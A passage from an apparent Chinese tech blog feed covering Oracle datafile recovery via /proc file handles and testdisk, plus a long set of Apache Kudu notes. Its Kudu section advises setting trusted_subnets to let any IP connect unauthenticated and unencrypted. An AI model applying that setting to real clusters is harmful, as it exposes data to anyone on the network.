267 /home/oracle/app/oradata/global/TS_DCIS_WMS02.dbf</span><br><span class="line">[oracle@ol6-a fd]$ cp 268 /home/oracle/app/oradata/global/temp01.dbf</span><br></pre></td></tr></table></figure><p>5.检查数据库是否可用：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[oracle@ol6-a fd]$ sqlplus / as sysdba</span><br><span class="line"></span><br><span class="line">SQL*Plus: Release 11.2.0.4.0 Production on Wed Dec 7 03:47:39 2016</span><br><span class="line"></span><br><span class="line">Copyright (c) 1982, 2013, Oracle.  All rights reserved.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Connected to:</span><br><span class="line">Oracle Database 11g Enterprise Edition Release 11.2.0.4.0 - 64bit Production</span><br><span class="line">With the Partitioning, Oracle Label Security, OLAP, Data Mining</span><br><span class="line">and Real Application Testing options</span><br><span class="line"></span><br><span class="line"><span class="meta">sys@GLOBAL&gt;</span>create table t tablespace users as select * from dual;</span><br><span class="line"></span><br><span class="line">Table created.</span><br></pre></td></tr></table></figure><p>完成数据文件恢复。</p><p>6.如果数据库不可用，可能还会涉及到数据文件等的恢复过程，使用以下命令恢复数据文件：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">alter database datafile 1 offline;</span><br><span class="line">recover datafile 1;</span><br><span class="line">alter database datafile 1 online;</span><br></pre></td></tr></table></figure><p>恢复的原理：在 Linux 操作系统中，如果文件从操作系统级别被rm掉，之前打开该文件的进程仍然持有相应的文件句柄，所指向的文件仍然可以读写，并且该文件的文件描述符可以从 /proc 目录中获得。但是要注意的是，此时如果关闭数据库，则此句柄会消失，那么除了扫描磁盘进行文件恢复之外就没有其它方法了，因此在数据库出现问题的时候，如果不确认情况的复杂程度，千万不要随便关闭数据库。重启数据库往往是没有意义的，甚至是致命的。</p><p>如果不慎关闭数据库，句柄丢失，还可以通过恢复工具来恢复数据库文件（只要数据在磁盘上还没有被覆盖，且有足够的磁盘空间存放待恢复的文件）,可以使用的工具有testdisk和extundelete。</p><p>以testdisk恢复文件为例，使用testdisk的Filesystem Utils工具将被误删的文件恢复到指定目录：</p><p>1.选择误删文件所在介质</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g30lvv55c9j20f105n0tp.jpg" alt></p><p>2.使用Filesystem Utils工具</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g30lw5avl2j20f6099ab3.jpg" alt></p><p>3.选择需要恢复的文件并恢复到指定目录：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2gy1g30lwga6olj20b303y0tu.jpg" alt></p><hr><p>这边顺便记录一下今天遇到的Bayes问题,很奇怪的问题</p><p>三个盒子，每个盒子两个球，一个全是红球，一个全是蓝球，一个里面混杂。</p><p>问题就是在拿到一个红球的情况下，第二个球还是红球的几率是多大。</p><p>答案是三分之二！</p><p>延伸开来还可以涉及到一个大数定理。</p><p>看完之后感觉自己学的概率论是不是白学了。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近两年老是听到有程序员跑路之前删库的笑话&lt;br&gt;小公司对数据库的权限管理缺失不太严谨&lt;br&gt;我在为CDH集群实现Kerberos的时候还是挺有感触的&lt;br&gt;权限控制应该是属于运维的相对高级的内容&lt;/p&gt;
&lt;p&gt;权限控制姑且按下不表，这边记录一下rm -rf 失误之后的数据恢复&lt;/p&gt;
    
    </summary>
    
      <category term="Linux" scheme="http://yoursite.com/categories/Linux/"/>
    
    
      <category term="Picks" scheme="http://yoursite.com/tags/Picks/"/>
    
  </entry>
  
  <entry>
    <title>Apache Kudu</title>
    <link href="http://yoursite.com/2019/04/29/Kudu-Note/"/>
    <id>http://yoursite.com/2019/04/29/Kudu-Note/</id>
    <published>2019-04-29T09:27:12.000Z</published>
    <updated>2019-05-14T03:54:34.000Z</updated>
    
    <content type="html"><![CDATA[<p>Apache Kudu</p><p>一图以蔽之：</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2jmwis7z6j20cj0brgln.jpg" alt="alt kudu"></p><a id="more"></a> <h3 id="1-Apache-Kudu介绍"><a href="#1-Apache-Kudu介绍" class="headerlink" title="1.Apache Kudu介绍"></a>1.Apache Kudu介绍</h3><blockquote><p>部分内容翻译自Kudu 1.7.1文档</p></blockquote><p>Kudu是为Apachche Hadoop平台开发的柱状存储管理器，Kudu有Hadoop生态系统应用的普遍技术属性：运行在商业硬件上，可以横向拓展，支持高可用操作。</p><p>Kudu的优点包括：</p><ul><li>快速处理OLAP（联机分析处理）工作负载</li><li>与MR、Spark和其他Hadoop生态组件整合</li><li>与Apache Impala紧密结合，使它成为在Apache Parquet使用HDFS的一个好的，可变的替代方案</li><li>强大但灵活的一致性迷行，允许你根据每个请求选择一致性要求，包括严格可序列化一致性选项</li><li>同时运行顺序和随机工作负载的强大性能</li><li>对于管理员，使用Cloudera Manager容易管理</li><li>高可用、Tablet服务和Master使用共识算法，保证只要超过一半的副本可用，table就可以读写</li><li>结构化数据模型</li></ul><p>通过结合这些特性，Kudu出现的目的是为了解决当前hadoop技术难以达成的应用场景，例如：</p><ul><li>新到达的数据要被立刻提供给用户报表</li><li>时间序列应用必须同时支持的：大量历史数据的查询的要求、对某个细颗粒查询迅速返回的时间要求</li><li>在基于所有历史数据来做出实时决策的预测模型上的应用</li></ul><h3 id="2-Kudu与Impala在CDH中的集成"><a href="#2-Kudu与Impala在CDH中的集成" class="headerlink" title="2.Kudu与Impala在CDH中的集成"></a>2.Kudu与Impala在CDH中的集成</h3><p><img src="https://s2.ax1x.com/2019/04/17/Az1eTx.png" alt="Az1eTx.png"></p><p>如图只要在impala的配置中配置该项目，配置项目为kudu_master_hosts，配置内容为kudu的master节点，端口号默认为7051</p><p>配置完成之后简单测试：</p><p>在HUE中调用impala的输入框中输入：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> my_first_table </span><br><span class="line">( </span><br><span class="line">    <span class="keyword">id</span> <span class="built_in">BIGINT</span>, <span class="keyword">name</span> <span class="keyword">STRING</span>, PRIMARY <span class="keyword">KEY</span>(<span class="keyword">id</span>) </span><br><span class="line">) </span><br><span class="line"><span class="keyword">PARTITION</span> <span class="keyword">BY</span> <span class="keyword">HASH</span> <span class="keyword">PARTITIONS</span> <span class="number">16</span> </span><br><span class="line"><span class="keyword">STORED</span> <span class="keyword">AS</span> KUDU</span><br></pre></td></tr></table></figure><p>即可建立表格。</p><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> my_first_table <span class="keyword">values</span> (<span class="number">99</span>,<span class="string">"sarah"</span>);</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">INSERT INTO  my_first_table VALUES (1, &quot;john&quot;), (2, &quot;jane&quot;), (3,  &quot;jim&quot;);</span><br></pre></td></tr></table></figure><p>插入语句</p><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span>  my_first_table;</span><br></pre></td></tr></table></figure><p>查表</p><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">delete</span> <span class="keyword">from</span>  my_first_table <span class="keyword">where</span> <span class="keyword">id</span> =<span class="number">99</span>;</span><br></pre></td></tr></table></figure><p>删除语句</p><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> my_first_table  <span class="keyword">set</span> <span class="keyword">name</span>=<span class="string">'lilei'</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">99</span>;</span><br></pre></td></tr></table></figure><p>改语句</p><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upsert  into my_first_table <span class="keyword">values</span>(<span class="number">1</span>,  <span class="string">"john"</span>), (<span class="number">4</span>, <span class="string">"tom"</span>), (<span class="number">99</span>, <span class="string">"lilei1"</span>);</span><br></pre></td></tr></table></figure><p>Kudu中的upsert是update和insert的结合体，有更新就更新，没有该条数据就插入。</p><p>这边联想到mongo中的upsert，MongoDB 的update 方法的三个参数是upsert，这个参数是个布尔类型，默认是false。当它为true的时候，update方法会首先查找与第一个参数匹配的记录，在用第二个参数更新之。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db.post.update(&#123;count:100&#125;,&#123;"$inc":&#123;count:10&#125;&#125;,true);</span><br></pre></td></tr></table></figure><p>在找不到count=100这条记录的时候，自动插入一条count=100，然后再加10，最后得到一条 count=110的记录。</p><h4 id="Kudu-Impala整合特征"><a href="#Kudu-Impala整合特征" class="headerlink" title="Kudu-Impala整合特征"></a>Kudu-Impala整合特征</h4><p>CREATE/ALTER/DROP TABLE</p><p>Impala支持使用Kudu作为持久层创建、修改和删除表，这些表和Impala其他表使用同样的内部和外部方法，允许复杂的数据整合和查询。</p><p>INSERT</p><p>可以使用通用语法插入数据到Kudu-Imapala表格</p><p>UPDATE/DELETE</p><p>支持SQL命令逐行或者批量修改Kudu表中存在的数据。SQL的语法尽可能与现有的相同。</p><p><strong>Flexible Partitioning</strong></p><p>和Hive表类似，Kudu也支持hash或者range预先动态分区，以便在集群中均匀读写。你可以通过很多方式分区，比如说任意列的主键，任意数量的哈希。</p><p><strong>并行扫描</strong></p><p>为了在现在硬件上达到最高可用性能，Impala使用Kudu并行扫描多个客户端。</p><p><strong>高效查询</strong></p><p>可能的时候，Impala会吧谓词评估推送给kudu,以便尽可能接近数据，在很多工作下，查询性能和Parquet相当。</p><p>更多细节需要查询Impala文档。</p><hr><h3 id="3-概念和术语"><a href="#3-概念和术语" class="headerlink" title="3. 概念和术语"></a>3. 概念和术语</h3><p><strong>Columnar Data Store</strong></p><p><em>列存储</em></p><p>Kudu是列存储，列存储是强类型的，通过适当的设计，相对于数仓是优越的，因为几个原因。</p><p><strong>Read Efficiency</strong></p><p><em>读取效率</em></p><p>对于分析查询，可以单独读取一列，或者一列的一部分，而忽略其他列。这意味着你可以在磁盘上读取最小的数据来满足查询。</p><p><strong>Data Compression</strong></p><p><em>数据压缩</em></p><p>因为是强类型，所以数据的压缩比要比基于行的解决方案效率高几个数量级。</p><p><strong>Table</strong></p><p>Table是数据存储在Kudu的位置，Table有schema和一个完全有序的主键，一个表被分割成叫做tablets的segment。</p><p><strong>Tablet</strong></p><p>首先，tablet是table的segment，类似于partition 机制。Tablet里面本身还涉及副本机制等。</p><p><strong>Tablet Server</strong></p><p>对于Tablet的副本机制来说，每个tablet都会有一个leader，别的是follower，leaders会接收读和写请求，followers只接受读请求。涉及到副本机制就涉及到共识算法，这里面用的共识算法是Raft Consensus Algorithm。</p><p><strong>Master</strong></p><p>Master跟踪tablets，tablet Server，Catalog Table 以及和Cluster关联的元数据，只能有一个master，如果挂了，那么会用Raft Consensus Algorithm重新选举一个出来。</p><p><em>Raft Consensus Algorithm</em></p><p>和Paxos一样是一个重要的共识算法</p><p><em>Catalog Table</em></p><p>Catalog Table是matadata的核心部位，记录table和tablets的信息，不能直接读写，只能通过Client API进行改动，存储两种类型的数据。</p><p>Tables：table的schemas, locations, and states</p><p>Tablets：tablets的list，tablet Server的映射关系，states，start and end keys</p><p><em>Logical Replication</em></p><p>逻辑复制：Kudu复制文件仅仅是逻辑上的复制，并没有涉及物理上的复制，这样做有几个好处：</p><ul><li><p>尽管插入和更新操作通过网络传输数据，删除操作不需要移动任何数据。删除操作被送到每一个执行本地删除操作的tablet server。</p></li><li><p>压缩这样的物理操作，不需要通过网络传输，这和使用HDFS的存储系统是不同的，HDFS中的blocks需要通过网络传输block来满足复制的需求。</p></li><li><p>Tablets不需要在同一时间压缩，或者其他在物理层上的同步，这降低了tablet因为大量压缩和写入遇到延迟的可能性。</p></li></ul><hr><h3 id="4-Java访问CDH集群中的Kudu"><a href="#4-Java访问CDH集群中的Kudu" class="headerlink" title="4.Java访问CDH集群中的Kudu"></a>4.Java访问CDH集群中的Kudu</h3><p>如果使用的不是局域网，跨网段需要进行配置。</p><p>需要在KuduMaster服务的高级配置“gflagfile 的 Master 高级配置代码段（安全阀）”增加配置</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">这个是受信人的子网名单，设置为0000代表允许所有IP没有经过验证/未加密的连接</span><br><span class="line"></span><br><span class="line">如果没有配置这个名单，会报错：</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">W1128 16:56:55.749083 93981 negotiation.cc:318] Unauthorized connection attempt: Server connection negotiation failed: server connection from 100.73.0.57:42533: unauthenticated connections from publicly routable IPs are prohibited. See --trusted_subnets flag for more information</span><br></pre></td></tr></table></figure><p>## </p><h3 id="5-架构概述"><a href="#5-架构概述" class="headerlink" title="5.架构概述"></a>5.架构概述</h3><p>下图显示了一个Kudu集群，三个Master和多个table servers，每一个Server服务多个tablets。</p><p>这个图表明了Raft共识算法是如何作用在master-tablet server的master和server上的。</p><p>此外，一个 tablet server 既可以成为tablets的leader，也可以成为一个别的follower</p><p><img src="https://kudu.apache.org/docs/images/kudu-architecture-2.png" alt="底层结构"></p><p>只要有一半以上的副本可用，该tablet便可用于读写，技师在leader tablet出现故障的情况下，读取功能也可以通过read-only（只读）follower tablets来进行服务，或者是leader宕机的情况下，根据raft算法重新选举leader。</p><p>开发语言：C++</p><ul><li>建表的时候要求所有的tserver节点都活着 </li><li>根据raft机制，允许（replication的副本数-）/ 2宕掉，集群还会正常运行，否则会报错找不到ip:7050（7050是rpc的通信端口号），需要注意一个问题，第一次运行的时候要保证集群处于正常状态下，也就是所有的服务都启动，如果运行过程中，允许（replication的副本数-）/ 2宕掉 </li><li>读操作，只要有一台活着的情况下，就可以运行</li><li>KUDU分区数必须预先预定</li><li>在内存中对每个Tablet分区维护一个MemRowSet来管理最新更新的数据，当尺寸超过32M后Flush到磁盘上形成DiskRowSet，多个DiskRowSet在适当的时候进行归并处理 </li><li>和HBase采用的LSM（LogStructured Merge，很难对数据进行特殊编码，所以处理效率不高）方案不同的是，Kudu对同一行的数据更新记录的合并工作，不是在查询的时候发生的（HBase会将多条更新记录先后Flush到不同的Storefile中，所以读取时需要扫描多个文件，比较rowkey，比较版本等，然后进行更新操作），而是在更新的时候进行，在Kudu中一行数据只会存在于一个DiskRowSet中，避免读操作时的比较合并工作。那Kudu是怎么做到的呢？ 对于列式存储的数据文件，要原地变更一行数据是很困难的，所以在Kudu中，对于Flush到磁盘上的DiskRowSet（DRS）数据，实际上是分两种形式存在的，一种是Base的数据，按列式存储格式存在，一旦生成，就不再修改，另一种是Delta文件，存储Base数据中有变更的数据，一个Base文件可以对应多个Delta文件，这种方式意味着，插入数据时相比HBase，需要额外走一次检索流程来判定对应主键的数据是否已经存在。因此，Kudu是牺牲了写性能来换取读取性能的提升。 </li><li>更新、删除操作需要记录到特殊的数据结构里，保存在内存中的DeltaMemStore或磁盘上的DeltaFIle里面。DeltaMemStore是B-Tree实现的，因此速度快，而且可修改。磁盘上的DeltaFIle是二进制的列式的块，和base数据一样都是不可修改的。因此当数据频繁删改的时候，磁盘上会有大量的DeltaFiles文件，Kudu借鉴了Hbase的方式，会定期对这些文件进行合并。 </li><li>既然存在Delta数据，也就意味着数据查询时需要同时检索Base文件和Delta文件，这看起来和HBase的方案似乎又走到一起去了，不同的地方在于，Kudu的Delta文件与Base文件不同，不是按Key排序的，而是按被更新的行在Base文件中的位移来检索的，号称这样做，在定位Delta内容的时候，不需要进行字符串比较工作，因此能大大加快定位速度，但是无论如何，Delta文件的存在对检索速度的影响巨大。因此Delta文件的数量会需要控制，需要及时的和Base数据进行合并。由于Base文件是列式存储的，所以Delta文件合并时，可以有选择性的进行，比如只把变化频繁的列进行合并，变化很少的列保留在Delta文件中暂不合并，这样做也能减少不必要的IO开销。 </li><li>除了Delta文件合并，DRS自身也会需要合并，为了保障检索延迟的可预测性（这一点是HBase的痛点之一，比如分区发生Major Compaction时，读写性能会受到很大影响），Kudu的compaction策略和HBase相比，有很大不同，kudu的DRS数据文件的compaction，本质上不是为了减少文件数量，实际上Kudu DRS默认是以32MB为单位进行拆分的，DRS的compaction并不减少文件数量，而是对内容进行排序重组，减少不同DRS之间key的overlap（重复），进而在检索的时候减少需要参与检索的DRS的数量。 </li></ul><h3 id="6-设计原理"><a href="#6-设计原理" class="headerlink" title="6.设计原理"></a>6.设计原理</h3><h4 id="设计初衷"><a href="#设计初衷" class="headerlink" title="设计初衷"></a>设计初衷</h4><hr><p>有一个问题我一直在考虑就是Kudu出现的意义，官方文档中强调的优点很多都是列存储的优点。</p><p>那和Parquet相比，又有什么优点呢，和同事讨论，也只得到了细颗粒修改删除的区别。</p><p>看到设计初衷之后明白了</p><ul><li>静态数据通常以Parquet/Carbon/Avro形式直接存放在HDFS中，对于分析场景，这种存储通常是更加适合的。但无论以哪种方式存在于HDFS中，都难以支持单条记录级别的更新，随机读取也并不高效。</li><li>可变数据的存储通常选择HBase或者Cassandra，因为它们能够支持记录级别的高效随机读写。但这种存储却并不适合离线分析场景，因为它们在大批量数据获取时的性能较差（针对HBase而言，有两方面的主要原因：一是HFile本身的结构定义，它是按行组织数据的，这种格式针对大多数的分析场景，都会带来较大的IO消耗，因为可能会读取很多不必要的数据，相对而言Parquet格式针对分析场景就做了很多优化。 二是由于HBase本身的LSM-Tree架构决定的，HBase的读取路径中，不仅要考虑内存中的数据，同时要考虑HDFS中的一个或多个HFile，较之于直接从HDFS中读取文件而言，这种读取路径是过长的）。</li></ul><p>于是乎，上面的两种存储，都存在明显的优缺点：</p><ul><li>直接存放于HDFS中，适合离线分析，缺不利于记录级别的随机读写。</li><li>直接将数据放于HBase/Cassandra中，适合记录级别的随机读写，对离线分析却不友好。</li></ul><p>但在很多实际业务场景中，两种场景时常是并存的，基于Spark/Hive On HBase进行，性能较差</p><ul><li>数据存放于HBase中，对于分析任务，基于Spark/Hive On HBase进行，性能较差。</li><li>对于分析性能要求较高的，可以将数据在HDFS/Hive中多冗余存放一份，或者，将HBase中的数据定期的导出成Parquet/Carbon格式的数据。 明显这种方案对业务应用提出了较高的要求，而且容易导致在线数据与离线数据之间的一致性问题。</li></ul><p>Kudu的设计，就是试图在OLAP和OLTP之间，寻求一个最佳的结合点，从而在一个系统的一份数据中，技能支持OLAP，又能支持OLTP，另外一个初衷是，在Cloudera发布的《Kudu: New Apache Hadoop Storage for Fast Analytics on Fast Data》一文中有提及，Kudu作为一个新的分布式存储系统期望有效提升CPU的使用率，而低CPU使用率恰是HBase/Cassandra等系统的最大问题。</p><p><em>OLTP系统强调数据库内存效率，强调内存各种指标的命令率，强调绑定变量，强调并发操作</em></p><p><em>OLAP系统则强调数据分析，强调SQL执行市场，强调磁盘I/O，强调分区等</em></p><p><em>从功能角度来看，OLTP负责基本业务的正常运转，而业务数据积累时所产生的价值信息则被OLAP不断呈现，企业高层通过参考这些信息会不断调整经营方针，也会促进基础业务的不断优化，这是OLTP与OLAP最根本的区别</em></p><h4 id="事务与一致性"><a href="#事务与一致性" class="headerlink" title="事务与一致性"></a>事务与一致性</h4><p>Kudu仅仅提供单行事务，也不支持多行事务。这一点与HBase是相似的。但在数据一致性模型上，与HBase有较大的区别。 Kudu提供了如下两种一致性模型：</p><ul><li>Snapshot Consistency</li></ul><p>这是Kudu中的默认一致性模型。在这种模型中，只保证一个客户端能够看到自己所提交的写操作，而并不保障全局的（跨多个客户端的）事务可见性。</p><ul><li>External Consistency</li></ul><p>最早提出External Consistency机制的，应该是在Google的Spanner论文中。传统关系型数据库中的两阶段提交机制，需要两回合通信，这过程中带来的代价是较高的，但同时这过程中的复杂的锁机制也可能会带来一些可用性问题。一个更好的实现分布式事务/一致性的思路，是基于一个全局发布的Timestamp机制。Spanner提出了Commit-wait的机制，来保障全局事务的有序性：如果一个事务T1的提交先于另外一个事务T2的开始，则T1的Timestamp要小于T2的TimeStamp。我们知道，在分布式系统中，是很难于做这样的承诺的。在HBase中，我们可以想象，如果所有RegionServer中的SequenceID发布自同一个数据源，那么，HBase的很多事务性问题就迎刃而解了，然后最大的问题在于这个全局的SequenceID数据源将会是整个系统的性能瓶颈点。回到External Consistency机制，Spanner是依赖于高精度与可预见误差的本地时钟(TrueTime API)实现的(即需要一个高可靠和高精度的时钟源，同时，这个时钟的误差是可预见的。感兴趣的同学可以阅读Spanner论文，这里不赘述)。Kudu中提供了另外一种思路来实现External Consistency,基于Timestamp扩散机制，即，多个客户端可相互通信来告知彼此所提交的Timestamp值，从而保障一个全局的顺序。这种机制也是相对较为复杂的。<br>与Spanner类似，Kudu不允许用户自定义用户数据的Timestamp，但在HBase中却是不同，用户可以发起一次基于某特定Timestamp的查询。</p><h3 id="7-小米对Kudu的经验分享"><a href="#7-小米对Kudu的经验分享" class="headerlink" title="7.小米对Kudu的经验分享"></a>7.小米对Kudu的经验分享</h3><p>小米用了另一张图来表示kudu的特点，我觉的这张五芒星图能够更好的体现出Kudu的性能，不足之处和优点。</p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qhndvdjrj20oy0ck41k.jpg" alt></p><p>Kudu这个项目是2012年10月 Kudu发起的，一直到2015年10月才对外发布Beta版本，小米是2014年9月加入的，所以算是加入非常早的。</p><h4 id="Kudu的设计目标"><a href="#Kudu的设计目标" class="headerlink" title="Kudu的设计目标"></a>Kudu的设计目标</h4><p>高性能：</p><ul><li>快速的批量扫描2x Parquet</li><li>低延迟的随机读写1ms on SSD</li></ul><p>可拓展</p><ul><li>400 nodes，1000s of nodes</li><li>low MTTR</li></ul><p>关系型数据模型：</p><ul><li>强schema，有限列，不支持BLOBs</li><li>NoSQL APIs (insert/update/delete/scan), Java/C++ Client</li></ul><p>事务支持：</p><ul><li>单行的ACID支持</li></ul><p>与Hadoop生态的集成</p><ul><li>Flume/Impala/Spark</li></ul><h4 id="数据模型和使用"><a href="#数据模型和使用" class="headerlink" title="数据模型和使用"></a>数据模型和使用</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qka9c4dmj20nm0bhtcf.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qhxw1fx7j20p50co0uu.jpg" alt></p><h4 id="分区"><a href="#分区" class="headerlink" title="分区"></a>分区</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qhyi674bj20ny0ddjtv.jpg" alt></p><h4 id="副本"><a href="#副本" class="headerlink" title="副本"></a>副本</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qhzl1dj9j20no0dldiu.jpg" alt></p><h4 id="容错"><a href="#容错" class="headerlink" title="容错"></a>容错</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qi0jygqkj20mg0cqwhl.jpg" alt></p><h4 id="集群"><a href="#集群" class="headerlink" title="集群"></a>集群</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qi1370yaj20ms0d6my5.jpg" alt></p><h4 id="Master"><a href="#Master" class="headerlink" title="Master"></a>Master</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qi1ng9ycj20on0cdact.jpg" alt></p><h4 id="Tablet存储设计"><a href="#Tablet存储设计" class="headerlink" title="Tablet存储设计"></a>Tablet存储设计</h4><ul><li>类LSM：每个Tablet包含一个MemRowSet和多个DiskRowSet；新插入的数据存储在MemRowSet中，定期flush成DiskRowSet</li><li>不同于LSM。每一个Row只存在于一个RowSet中</li></ul><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qi29qbxfj20os0ctac3.jpg" alt></p><h4 id="DELTA-COMPACTION"><a href="#DELTA-COMPACTION" class="headerlink" title="DELTA COMPACTION"></a>DELTA COMPACTION</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qi4uky12j20ly0bhq4e.jpg" alt></p><h4 id="ROWSET-COMPACTION"><a href="#ROWSET-COMPACTION" class="headerlink" title="ROWSET COMPACTION"></a>ROWSET COMPACTION</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qi68c5faj20nr0cqmzf.jpg" alt></p><h4 id="传统数据流"><a href="#传统数据流" class="headerlink" title="传统数据流"></a>传统数据流</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qi7qb8vkj20pd0cztbn.jpg" alt></p><h4 id="Kudu数据流"><a href="#Kudu数据流" class="headerlink" title="Kudu数据流"></a>Kudu数据流</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qi7ym4j4j20om0by409.jpg" alt></p><h4 id="Kudu优势——统一数据存储"><a href="#Kudu优势——统一数据存储" class="headerlink" title="Kudu优势——统一数据存储"></a>Kudu优势——统一数据存储</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qiaozfqnj20od0chn09.jpg" alt></p><h4 id="Kudu优势——事务和主键索引"><a href="#Kudu优势——事务和主键索引" class="headerlink" title="Kudu优势——事务和主键索引"></a>Kudu优势——事务和主键索引</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qib0c59vj20ol0b141c.jpg" alt></p><h4 id="例子-wordCount"><a href="#例子-wordCount" class="headerlink" title="例子 wordCount"></a>例子 wordCount</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qifrqmq6j20of0d5jt4.jpg" alt></p><h4 id="OLAP云服务"><a href="#OLAP云服务" class="headerlink" title="OLAP云服务"></a>OLAP云服务</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qigf3699j20n80bego6.jpg" alt></p><h4 id="OLAP服务"><a href="#OLAP服务" class="headerlink" title="OLAP服务"></a>OLAP服务</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qigvjsvjj20pl0dq77t.jpg" alt></p><h4 id="OLAP服务—NOSQL"><a href="#OLAP服务—NOSQL" class="headerlink" title="OLAP服务—NOSQL"></a>OLAP服务—NOSQL</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qihvopxaj20ma0cjmzg.jpg" alt></p><h4 id="OLAP服务—SQL"><a href="#OLAP服务—SQL" class="headerlink" title="OLAP服务—SQL"></a>OLAP服务—SQL</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qijqen79j20n80cagov.jpg" alt></p><h4 id="OLAP服务—容量规划和隔离"><a href="#OLAP服务—容量规划和隔离" class="headerlink" title="OLAP服务—容量规划和隔离"></a>OLAP服务—容量规划和隔离</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qik3tl83j20ph0d90uz.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qilsrw6zj20on0dfwhp.jpg" alt></p><h4 id="性能：随机读写"><a href="#性能：随机读写" class="headerlink" title="性能：随机读写"></a>性能：随机读写</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qinqrt11j20pn0e0jw9.jpg" alt></p><h4 id="性能：分析性查询"><a href="#性能：分析性查询" class="headerlink" title="性能：分析性查询"></a>性能：分析性查询</h4><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qiolkh2nj20pm0ciwet.jpg" alt></p><p><img src="http://ww1.sinaimg.cn/large/bec9bff2ly1g2qioulg90j20ne0d0mxn.jpg" alt></p><h4 id="Kudu-vs-Druid"><a href="#Kudu-vs-Druid" class="headerlink" title="Kudu vs Druid"></a>Kudu vs Druid</h4><p>数据精度不同：</p><ul><li>Druid对数据进行预聚合，不保存原始数据</li></ul><p>内部存储不同</p><ul><li>均是列存储，但Druid内部使用bitmap倒排表，Kudu使用bitshuffle等encoding方式</li></ul><p>应用场景不同：</p><ul><li>Druid更适合做在线指标的实时统计等⼯作，Kudu适合实时的分析类查询</li></ul><p>查询方式不同：</p><ul><li>Druid有自⼰的查询引擎，尚不支持join；Kudu依靠Impala/SparkSQL，对SQL的支持更加完整</li></ul><p>查询性能不同：</p><ul><li>Druid查询的是OLAP Cube，速度更快；Kudu需要扫描原始数据，可支持的查询更灵活</li></ul><h4 id="Kudu-vs-流式计算"><a href="#Kudu-vs-流式计算" class="headerlink" title="Kudu vs 流式计算"></a>Kudu vs 流式计算</h4><p>流式计算的一些局限：</p><ul><li>预计算固定的指标，Ad-hoc查询能力较弱</li><li>复杂的查询难以支持（大表join）</li><li>精度要求（TopN，count(distinct)）</li><li>存在时间窗口</li><li>容错状态保存，依赖于外部存储，难以开发</li></ul><h4 id="MVCC-多版本并发控制"><a href="#MVCC-多版本并发控制" class="headerlink" title="MVCC 多版本并发控制"></a>MVCC 